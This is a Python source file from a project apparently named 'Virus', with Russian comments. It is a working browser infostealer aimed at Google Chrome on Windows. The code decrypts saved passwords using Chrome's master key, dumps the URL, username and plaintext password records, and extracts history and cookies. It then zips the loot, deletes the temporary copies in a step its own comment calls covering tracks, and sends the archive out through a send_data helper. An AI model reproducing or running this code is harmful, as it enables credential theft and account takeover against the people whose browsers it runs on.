from Virus.Helpers.Support import (BrowsersSupport, BrowsersData,
                                   user_path, current_user, local)
import shutil
import sqlite3
import os


chrome_path = f'C:\\Users\\{current_user}\\AppData\\Roaming\\Chrome'


class Chrome:
    """ Данные Chrome"""
    path = rf'{local}\Google\Chrome\User Data\Local State'  # путь до файла с зашифрованным мастер паролем
    
    # ----------------------------------------------- Логины и Пароли начало скрипта
    @staticmethod
    def get_login_and_password():
        try:
            master_key = BrowsersSupport.get_master_key(Chrome.path)
            login_db = user_path + r'\AppData\Local\Google\Chrome\User Data\default\Login Data'
            shutil.copy2(login_db, user_path + '\\AppData\\Roaming\\Loginvault.db')

            conn = sqlite3.connect(user_path + '\\AppData\\Roaming\\Loginvault.db')
            cursor = conn.cursor()
            data = cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall()
            cursor.close()
            conn.close()
            os.remove(user_path + '\\AppData\\Roaming\\Loginvault.db')

            for r in data:
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = BrowsersSupport.DecryptValue(encrypted_password, master_key)

                alldatapass = "URL: " + url + " UserName: " + username + " Password: " + decrypted_password + "\n"

                with open(user_path + '\\AppData\\Roaming\\Chrome\\Chrome_login_and_password.txt', "a") as o:
                    o.write(alldatapass)
        except:
            pass

    # ----------------------------------------------- Логины и Пароли конец скрипта

    # ----------------------------------------------- История и кукисы начало скрипта
    @staticmethod
    def main_history_cookies():
        try:
            data_path = os.path.expanduser('~') + r"\AppData\Local\Google\Chrome\User Data\Default"
            history_db = os.path.join(data_path, 'History')
            shutil.copy2(history_db, user_path + '\\AppData\\Roaming\\history.db')
            c = sqlite3.connect(user_path + '\\AppData\\Roaming\\history.db')
            cursor = c.cursor()
            with open(user_path + '\\AppData\\Roaming\\Chrome\\history-Chrome.txt', "a", encoding="utf-8") as history:  # извлекаем всю историю
                BrowsersData.History(cursor, history)

            data_path = os.path.expanduser('~') + r"\AppData\Local\Google\Chrome\User Data\Default\Network"
            cookies_db = os.path.join(data_path, 'Cookies')
            shutil.copy2(cookies_db, user_path + '\\AppData\\Roaming\\cookies.db')
            c = sqlite3.connect(user_path + '\\AppData\\Roaming\\cookies.db')
            cursor = c.cursor()

            path_to_save = '\\AppData\\Roaming\\Chrome\\Cookies-Chrome.json'
            BrowsersData.cookies(cursor, Chrome.path, path_to_save)
        except:
            pass

    # ----------------------------------------------- История и кукисы конец скрипта

    @staticmethod
    def create_zip_cover_tracks():
        """ создание архива и заметание следов """
        try:
            os.remove(user_path + '\\AppData\\Roaming\\cookies.db')
            os.remove(user_path + '\\AppData\\Roaming\\Loginvault.db')
            os.remove(user_path + '\\AppData\\Roaming\\history.db')
        except:
            pass

        shutil.make_archive(chrome_path, 'zip', chrome_path)
        shutil.rmtree(chrome_path)

    @staticmethod
    def send_chrome_data():
        try:
            with open(user_path + '\\AppData\\Roaming\\Chrome.zip', 'rb') as chrome_data:
                BrowsersSupport.send_data(chrome_data, "Chrome")
        except:
            pass

        try:
            os.remove(user_path + '\\AppData\\Roaming\\Chrome.zip')  # удаляем архив
        except:
            pass

    @staticmethod
    def main():
        try:
            Chrome.get_login_and_password()
            Chrome.main_history_cookies()
            Chrome.create_zip_cover_tracks()
            Chrome.send_chrome_data()
        except:
            shutil.rmtree(chrome_path)


if __name__ == '__main__':
    Chrome.main()
